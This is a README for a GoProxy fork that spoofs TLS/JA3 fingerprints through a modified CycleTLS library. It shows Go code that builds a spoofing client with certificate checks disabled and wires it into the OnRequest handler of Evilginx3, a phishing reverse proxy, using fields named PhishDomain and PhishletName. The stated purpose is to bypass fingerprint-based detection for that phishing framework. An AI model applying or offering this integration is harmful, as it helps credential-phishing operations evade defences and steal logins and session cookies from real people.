# Introduction

This project is forked from GoProxy (https://godoc.org/github.com/procoder17/goproxy-spoof-tls-ja3)

[![GoDoc](https://godoc.org/github.com/procoder17/goproxy-spoof-tls-ja3?status.svg)](https://godoc.org/github.com/procoder17/goproxy-spoof-tls-ja3)
[![Join the chat at https://gitter.im/procoder17/goproxy-spoof-tls-ja3](https://badges.gitter.im/Join%20Chat.svg)](https://gitter.im/procoder17/goproxy-spoof-tls-ja3?utm_source=badge&utm_medium=badge&utm_campaign=pr-badge&utm_content=badge)
![Status](https://github.com/procoder17/goproxy-spoof-tls-ja3/workflows/Go/badge.svg)

I have been working on Evilginx3 project for updating myself and met the TLS fingerprint issues.
In order to bypass TLS/JA3 fingerprint, I have used CycleTLS (https://github.com/Danny-Dasilva/CycleTLS)
Of course, I have forked CycleTLS and updated some code for GoProxy.

# How to use this project

```go
    
    import (
        "log"

        "github.com/procoder17/CycleTLSForGoProxy/cycletls"
        http3 "github.com/Danny-Dasilva/fhttp"
    )

    func CreateTlspoofClient(ja3 string, ua string) (client http3.Client) {
        browser := cycletls.Browser{
            JA3:                ja3,
            UserAgent:          ua,
            Cookies:            nil,
            InsecureSkipVerify: true,
        }

        timeout := 15

        client, err := cycletls.NewClient(
            browser,
            timeout,
            false,
            ua,
            "", //request.Options.Proxy,
        )
        if err != nil {
            log.Fatal(err)
        }

        return client
    }


    // Select JA3 and User-Agent for spoofing.
    ja3 := "771,4865-4867-4866-49195-49199-52393-52392-49196-49200-49162-49161-49171-49172-51-57-47-53-10,0-23-65281-10-11-35-16-5-51-43-13-45-28-21,29-23-24-25-256-257,0"
	ua := "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:87.0) Gecko/20100101 Firefox/87.0"

	tlspoofClient := CreateTlspoofClient(ja3, ua)

    // update evilginx3's OnRequest() function like the following.
	p.Proxy.OnRequest().
		DoFunc(func(req *http.Request, ctx *goproxy.ProxyCtx) (*http.Request, *http.Response) {

			ps := &goproxy.ProxySession{
				SessionId:      "",
				Created:        false,
				PhishDomain:    "",
				PhishletName:   "",
				Index:          -1,
				CycleTlsClient: &tlspoofClient,
			}

			ctx.UserData = ps

            //.........................
        })
```



